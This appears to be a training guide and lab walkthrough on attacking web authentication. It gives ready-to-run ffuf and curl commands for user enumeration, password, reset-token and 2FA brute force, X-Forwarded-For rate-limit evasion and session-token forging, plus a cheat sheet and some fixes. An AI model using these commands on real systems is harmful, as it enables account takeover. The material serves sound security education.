# Authentication Attacks: Field Notes

A hands-on reference for web authentication: core concepts, user enumeration, password and token brute-forcing, 2FA bypass, weak brute-force protection, default credentials, vulnerable password reset flows, direct-access and parameter-based auth bypass, and session token attacks. It ends with a combined skills-assessment walkthrough and a cheat sheet.

---

## Table of Contents

1. [Authentication Fundamentals](#1-authentication-fundamentals)
2. [Authentication Methods](#2-authentication-methods)
3. [Single-Factor vs. Multi-Factor](#3-single-factor-vs-multi-factor)
4. [Attacks by Authentication Type](#4-attacks-by-authentication-type)
5. [User Enumeration](#5-user-enumeration)
6. [Brute-Forcing Passwords](#6-brute-forcing-passwords)
7. [Brute-Forcing Password Reset Tokens](#7-brute-forcing-password-reset-tokens)
8. [Brute-Forcing 2FA Codes](#8-brute-forcing-2fa-codes)
9. [Weak Brute-Force Protection](#9-weak-brute-force-protection)
10. [Default Credentials](#10-default-credentials)
11. [Vulnerable Password Reset](#11-vulnerable-password-reset)
12. [Auth Bypass via Direct Access](#12-auth-bypass-via-direct-access)
13. [Auth Bypass via Parameter Modification](#13-auth-bypass-via-parameter-modification)
14. [Attacking Session Tokens](#14-attacking-session-tokens)
15. [Further Session Attacks](#15-further-session-attacks)
16. [Skills Assessment Walkthrough](#16-skills-assessment-walkthrough)
17. [Cheat Sheet](#17-cheat-sheet)

---

## 1. Authentication Fundamentals

**Authentication** verifies *who you are*. **Authorization** determines *what you can access*.

| Aspect | Authentication | Authorization |
|---|---|---|
| Question | "Who are you?" | "What can you do?" |
| Needs | Credentials | Policies and permissions |
| Order | Happens first | Happens after authentication |

> **Key rule:** Authentication comes before authorization. A valid session is not the same as permission.

---

## 2. Authentication Methods

### Knowledge-based (something you know)
Passwords, passphrases, PINs, and security question answers.

### Ownership-based (something you have)
ID cards, hardware security tokens, and authenticator apps (TOTP).

### Inherence-based (something you are)
Fingerprints, facial patterns, voice recognition, and signatures.

---

## 3. Single-Factor vs. Multi-Factor

- **Single-factor (SFA):** one method, such as a password alone.
- **Multi-factor (MFA):** more than one method, such as a password plus TOTP.
- **Two-factor (2FA):** exactly two factors.

MFA makes account takeover much harder, but a short TOTP with no rate limiting can still be brute-forced.

---

## 4. Attacks by Authentication Type

**Knowledge-based** is the weakest and most commonly targeted. Static secrets can be guessed, phished, or leaked in breaches. Relevant attacks include brute force, social engineering, credential stuffing, and password spraying.

**Ownership-based** resists phishing better, since a physical item cannot be typed into a fake page. Its weaknesses are theft, cloning (for example, NFC badges), and cryptographic flaws. Distributing tokens is also costly.

**Inherence-based** is convenient but fragile. Biometrics cannot be changed once leaked. A 2019 breach of a biometric smart lock exposed fingerprints permanently. Recognition algorithms also raise privacy and bias concerns.

---

## 5. User Enumeration

User enumeration occurs when an application responds differently to valid and invalid usernames. It can appear on login forms, registration forms, and password reset flows.

| Input | Response | Meaning |
|---|---|---|
| `abc` (invalid) | `Unknown user.` | Username does not exist |
| `admin` (valid) | `Invalid credentials.` | Username exists, password is wrong |

### Exploit with ffuf

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://TARGET/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=invalid" \
  -fr "Unknown user" \
  -t 100
```

`-fr "Unknown user"` removes the invalid-user responses, so the remaining hits are valid usernames.

### Side-channel enumeration

Response timing can reveal valid usernames, because a valid username triggers a database lookup. This is covered further in the whitebox attacks material.

### Is it always a vulnerability?

Not always. WordPress, for example, allows it by default. Still, avoid it as defense in depth. Logging in by email instead of username is one option.

---

## 6. Brute-Forcing Passwords

Passwords are static secrets, and users often choose weak ones such as dictionary words or predictable patterns.

### Filter the wordlist by password policy

If the application enforces a policy, filter the wordlist so only compliant candidates remain. For a policy of at least 10 characters with upper case, lower case, and a digit:

```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt

wc -l custom_wordlist.txt   # about 151,631 lines, down from roughly 14 million
```

### Attack

```bash
ffuf -w custom_wordlist.txt \
  -u http://TARGET/index.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=FUZZ" \
  -fr "Invalid credentials" \
  -t 100
```

A success often shows as `302` (redirect) instead of `200` (login page re-rendered).

### Time estimate

About 150,000 candidates at roughly 150 requests per second takes around 17 minutes at `-t 100`. You can raise `-t` or add `-rate` if the server tolerates it.

Always find the exact error string first (for `-fr`) or the failed-response size (for `-fs`) before trusting results.

---

## 7. Brute-Forcing Password Reset Tokens

Password reset relies on one-time tokens sent by email or SMS. A short or predictable token can be brute-forced, leading to full account takeover.

### Identify a weak token

1. Request a reset for your own account.
2. Inspect the link, for example `http://TARGET/reset_password.php?token=7351`.
3. A four-digit token has only 10,000 possible values, which makes it trivial to enumerate.

### Attack

```bash
seq -w 0 9999 > tokens.txt   # 0000 through 9999

ffuf -w tokens.txt \
  -u "http://TARGET/reset_password.php?token=FUZZ" \
  -fr "The provided token is invalid" \
  -t 100
```

A hit that is not filtered out contains a valid token. Use it to load the reset page for the victim's account and set a new password.

```bash
curl "http://TARGET/reset_password.php?token=<VALID_TOKEN>"
```

---

## 8. Brute-Forcing 2FA Codes

2FA combines a password (knowledge) with a TOTP code (ownership). A four- to six-digit code with no rate limiting is brute-forceable.

### Attack flow

**Step 1.** Log in with valid credentials and save the session cookie:

```bash
curl -s -i -c cookies.txt -X POST http://TARGET/index.php \
  -d "username=admin&password=<PASSWORD>" | grep -i "location\|set-cookie"
```

**Step 2.** Confirm the OTP parameter and the error string:

```bash
curl -s -b cookies.txt -X POST http://TARGET/2fa.php -d "otp=0000"
# "Invalid 2FA Code."
```

**Step 3.** Generate the candidate list:

```bash
seq -w 0 9999 > tokens.txt
```

**Step 4.** Brute-force using your session cookie:

```bash
ffuf -w tokens.txt \
  -u http://TARGET/2fa.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<YOUR_SESSION>" \
  -d "otp=FUZZ" \
  -fr "Invalid 2FA Code" \
  -t 100
```

**Step 5.** Access the protected page:

```bash
curl -s -b cookies.txt http://TARGET/admin.php | grep -io "HTB{[^}]*}"
```

### Critical caveat

The first 302 hit is the correct OTP. Every request after it also returns 302, because the session is now 2FA-verified. If you restart ffuf after a hit without getting a fresh session, every response will look like a false positive.

---

## 9. Weak Brute-Force Protection

### Rate limits

Rate limits cap request frequency to block brute force, denial of service, and abuse. When triggered, the server slows down or blocks the client.

### Bypass: spoofed X-Forwarded-For

Applications behind proxies or load balancers often trust `X-Forwarded-For` to identify the real client IP. If the limiter keys on that header, rotating its value on each request defeats it.

```bash
for i in $(seq 1 100); do
  ip=$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)
  curl -s -H "X-Forwarded-For: $ip" -X POST http://TARGET/login.php \
    -d "username=admin&password=guess$i"
done
```

The same can be done in ffuf with a wordlist of fake addresses. This technique has real-world precedent (CVE-2020-35590).

### CAPTCHAs

CAPTCHAs force a human into the loop and can make brute force impractical. They fail when:
- The solution is leaked in the HTML or JavaScript, so a bot can read it.
- A token can be reused across many requests.
- The server does not validate the answer on the back end.
- AI-based solvers defeat image or audio challenges.

---

## 10. Default Credentials

Common defaults include `admin:admin`, `admin:password`, and `admin@admin.com:password` (the last from BookStack's install documentation).

| Source | Where |
|---|---|
| CIRT.net password database | https://cirt.net/passwords |
| SecLists default credentials | `/usr/share/seclists/Passwords/Default-Credentials/` |
| SCADA vendor default passwords | Public GitHub repositories |
| Search engine | `<product> default credentials` |

### Attack flow

1. Fingerprint the application: title, footer, headers, favicon.
2. Identify the product and version.
3. Look up its default credentials.
4. Try them on the login form.
5. If one works, you have authenticated access.

Vendor install documentation is often public and sometimes lists the default account in plain text, so attackers read the same docs administrators do.

---

## 11. Vulnerable Password Reset

### 11.1 Guessable security questions

Predefined questions such as "What city were you born in?" have the same wording for every user, and many answers are guessable from public lists.

Build a candidate list from a public dataset:

```bash
wget -q https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv
tail -n +2 world-cities.csv | cut -d ',' -f1 | tr -d '"' | sort -u > city_wordlist.txt
```

Brute-force the answer:

```bash
ffuf -w city_wordlist.txt \
  -u http://TARGET/security_question.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" \
  -d "security_response=FUZZ" \
  -fr "Incorrect response." \
  -t 100
```

If you know the target's country, narrow the list (for example, filter the dataset by country) to make the attack faster.

### 11.2 Manipulating the reset request

The reset flow may carry the username as a hidden parameter in each step. If the server does not check that the username matches the user it verified earlier, you can swap it.

1. Start a reset for your own account.
2. Answer your security question.
3. At the password-change step, replace the username in the request body with the target's:

```http
POST /reset_password.php HTTP/1.1
Cookie: PHPSESSID=<your_session>

password=<NEW_PASSWORD>&username=admin
```

If the server trusts the parameter, the target's password changes.

**Fix:** store the verified identity in server-side session state, and never trust a client-supplied username in the final step.

---

## 12. Auth Bypass via Direct Access

### The bug: a missing `exit;`

```php
if (!$_SESSION['active']) {
    header("Location: index.php");
    // Missing exit; The script keeps running.
}
// Protected HTML is still rendered below
```

The 302 response still contains the full protected page in its body. Browsers follow the redirect and discard that body, so the user only sees the login page.

### Exploit with Burp Suite

1. Enable Intercept.
2. Browse to `/admin.php`.
3. Right-click the request and choose **Do intercept > Response to this request**.
4. Forward the request and pause at the response.
5. Change the status line from `302 Found` to `200 OK`.
6. Forward it. The browser renders the protected page.

### Exploit with curl

curl does not follow redirects by default, so the body is returned directly:

```bash
curl -s http://TARGET/admin.php | grep -io "HTB{[^}]*}"
```

### Fix

```php
if (!$_SESSION['active']) {
    header("Location: index.php");
    exit;
}
```

---

## 13. Auth Bypass via Parameter Modification

### The bug

The application trusts a client-supplied parameter such as `user_id` to decide identity or access.

### Attack flow

**Step 1.** Log in as a low-privilege user. The server redirects to `/admin.php?user_id=<ID>`.

**Step 2.** Confirm the parameter matters:
- `/admin.php?user_id=<ID>` returns 200 with a "no privileges" message.
- `/admin.php` with no parameter returns 302 to the login page.

This shows `user_id` is used for authorization.

**Step 3.** Check whether the session is required at all:

```bash
curl -s "http://TARGET/admin.php?user_id=<ID>"   # 200 with no cookie
```

**Step 4.** Enumerate `user_id` values to find an admin:

```bash
seq 1 500 > userids.txt

ffuf -w userids.txt \
  -u "http://TARGET/admin.php?user_id=FUZZ" \
  -fs <NON_ADMIN_PAGE_SIZE> \
  -t 100
```

Filtering out the size of the non-admin page leaves any response with a different size as an admin candidate.

**Step 5.** Retrieve the admin page:

```bash
curl -s "http://TARGET/admin.php?user_id=<ADMIN_ID>" | grep -io "HTB{[^}]*}"
```

### Fix

- Never trust a client-supplied `user_id` for authentication or authorization.
- Derive the user from the server-side session.
- Enforce role-based access control on the server.

### Related vulnerability classes

Type juggling (whitebox attacks), injection (SQLi and others), and parameter logic bugs.

---

## 14. Attacking Session Tokens

A session token is proof of identity. If an attacker can guess or forge one, they take over the account.

### 14.1 Brute-forcing weak tokens

**Short tokens.** A four-character token is trivially brute-forceable.

**Static plus dynamic.** Many tokens share a long static prefix with only a few changing characters. Collect several tokens and compare them. For example, if 28 characters are constant and only 4 vary, the search space is tiny.

**Incrementing tokens.** Tokens that count upward (for example, 141233, 141234, and so on) are trivially enumerable.

To check, log in several times, capture each token, and compare them for patterns.

### 14.2 Forging predictable tokens

**Base64-encoded data:**

```bash
# Decode
echo -n "<TOKEN>" | base64 -d
# user=htb-stdnt;role=user

# Forge an admin token
echo -n 'user=htb-stdnt;role=admin' | base64

# Send it
curl -s -b "session=<FORGED_TOKEN>" http://TARGET/admin.php
```

**Hex-encoded data:**

```bash
# Decode
echo -n "<TOKEN>" | xxd -r -p

# Forge an admin token
echo -n 'user=htb-stdnt;role=admin' | xxd -p

# Send it
curl -s -b "session=<FORGED_TOKEN>" http://TARGET/admin.php
```

**Encrypted data** is harder to attack from a black-box position. It usually requires a weak cipher, a missing integrity check, or access to the source code.

### Fix

- Use cryptographically random tokens of at least 128 bits.
- Sign tokens with HMAC, or store session state on the server.
- Never trust encoded data as-is.

---

## 15. Further Session Attacks

### 15.1 Session fixation

The application does not issue a new session token after login, so an attacker can plant a known token in the victim's browser.

1. The attacker obtains a session token, for example `a1b2c3d4e5f6`.
2. The attacker tricks the victim into using it, for example through a link such as `http://TARGET/?sid=a1b2c3d4e5f6`.
3. The victim logs in, and the token stays the same.
4. The attacker reuses the token and hijacks the session.

**Fix:**

```php
session_regenerate_id(true);   // issue a new token after login
```

### 15.2 Improper session timeout

Session tokens that never expire let a stolen session work indefinitely.

| Application type | Suggested timeout |
|---|---|
| Health, banking, admin | Minutes (5 to 15) |
| Social media | Hours to 30 days |
| APIs | Per request, or very short |

Best practices:
- Use both an idle timeout and an absolute timeout.
- Invalidate sessions on logout, password change, and privilege change.
- Treat "remember me" as opt-in, with a longer but bounded lifetime.

---

## 16. Skills Assessment Walkthrough

**Target:** a web application for a fictional company (SecureMint Innovations).
**Goal:** combine several attacks to obtain the flag.

### Recon

- `login.php` (200): login form
- `register.php` (200): open registration
- `2fa.php` (302): protected, redirects to login
- No `reset.php` or `admin.php` found

### Step 1: User enumeration by response size

The failed-login page had one response size, and a valid username with a wrong password had a slightly different size.

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=<POLICY_COMPLIANT_TEST_PASSWORD>" \
  -fs <FAILED_LOGIN_SIZE> \
  -t 100
```

The test password must satisfy the password policy. If it does not, the server's responses are inconsistent and the size filter fails.

Result: `gladys` is a valid user.

### Step 2: Build a policy-compliant wordlist

The registration page enforces 12 characters, alphanumeric only, with an upper-case letter, a lower-case letter, and a digit.

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
  | grep '[[:lower:]]' \
  | grep '[[:digit:]]' \
  | grep -E '^.{12}$' \
  | grep -E '^[a-zA-Z0-9]+$' > policy12.txt

wc -l policy12.txt   # about 17,000
```

### Step 3: Brute-force the password

```bash
ffuf -w policy12.txt \
  -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" \
  -fr "Invalid credentials" \
  -t 100
```

### Step 4: Log in and check for a flag

```bash
curl -s -i -c cookies.txt -X POST http://TARGET/login.php \
  -d "username=gladys&password=<RECOVERED_PASSWORD>" | grep -i "location\|set-cookie"

# The login redirects to /2fa.php, but the profile page body may leak the flag
curl -s -b cookies.txt http://TARGET/profile.php | grep -io "HTB{[^}]*}"
```

### Step 5: If the body does not leak, brute-force the OTP

```bash
seq -w 0 9999 > tokens.txt

ffuf -w tokens.txt -u http://TARGET/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" -d "otp=FUZZ" -fr "Invalid OTP" -t 100

# The first 302 hit is the correct OTP. Then fetch profile.php for the flag.
```

### Attack combination

| Technique | Purpose |
|---|---|
| Size-based user enumeration | Find a valid username |
| Policy-aware brute force | Recover the password |
| Direct-access bypass or 2FA brute force | Get past 2FA to the flag |

---

## 17. Cheat Sheet

### Enumeration

```bash
# Error-based user enumeration
ffuf -w usernames.txt -u http://T/login.php -X POST \
  -d "username=FUZZ&password=invalid" -fr "Unknown user" -t 100

# Size-based user enumeration
ffuf -w usernames.txt -u http://T/login.php -X POST \
  -d "username=FUZZ&password=ValidPass123" -fs <FAILED_SIZE> -t 100
```

### Password brute force

```bash
# Filter rockyou by policy (at least 10 characters, upper, lower, digit)
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > wl.txt

ffuf -w wl.txt -u http://T/login.php -X POST \
  -d "username=admin&password=FUZZ" -fr "Invalid credentials" -t 100
```

### Policy: 12 characters, alphanumeric

```bash
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' \
  | grep -E '^.{12}$' | grep -E '^[a-zA-Z0-9]+$' > policy12.txt
```

### Reset token brute force

```bash
seq -w 0 9999 > tokens.txt
ffuf -w tokens.txt -u "http://T/reset_password.php?token=FUZZ" -fr "invalid" -t 100
```

### 2FA OTP brute force

```bash
seq -w 0 9999 > tokens.txt
ffuf -w tokens.txt -u http://T/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=<SESSION>" -d "otp=FUZZ" -fr "Invalid 2FA Code" -t 100
```

### Session token forging

```bash
# Base64
echo -n "<TOKEN>" | base64 -d
echo -n 'user=admin;role=admin' | base64

# Hex
echo -n "<TOKEN>" | xxd -r -p
echo -n 'user=admin;role=admin' | xxd -p
```

### Direct access (redirect body leak)

```bash
curl -s http://T/admin.php | grep -io "HTB{[^}]*}"
```

### Parameter modification

```bash
for id in $(seq 1 500); do
  s=$(curl -s -o /dev/null -w "%{size_download}" "http://T/admin.php?user_id=$id")
  [ "$s" != "<NON_ADMIN_SIZE>" ] && echo "user_id=$id -> $s"
done
```

### Default credentials

```bash
for p in admin password admin123 Password1 Admin@123; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://T/login.php \
    -d "username=admin&password=$p")
  echo "$p -> $code"
done
```

### X-Forwarded-For rotation

```bash
for i in $(seq 1 50); do
  ip=$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)
  curl -s -H "X-Forwarded-For: $ip" -X POST http://T/login.php \
    -d "username=admin&password=guess$i"
done
```

### Useful wordlist paths

```text
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

---

## Final Takeaways

- Authentication is not authorization. Verify identity before checking permissions.
- Knowledge-based authentication is the weakest link, so passwords, PINs, and security answers are the usual targets.
- Filter wordlists by policy. Reductions of 99 percent are common.
- Collect several tokens and look for static and dynamic patterns.
- Redirects do not protect data. A 302 body can leak an entire page.
- Never trust client-supplied identity parameters such as `user_id` or `username`.
- Session tokens are authentication. Make them random, signed, and short-lived.
- Rate limits are not protection on their own. `X-Forwarded-For` can bypass IP-based limits.
- MFA is only as strong as its weakest factor. A short TOTP with no rate limit is easy to brute-force.
- Chain the attacks: enumerate, brute-force, bypass, escalate.
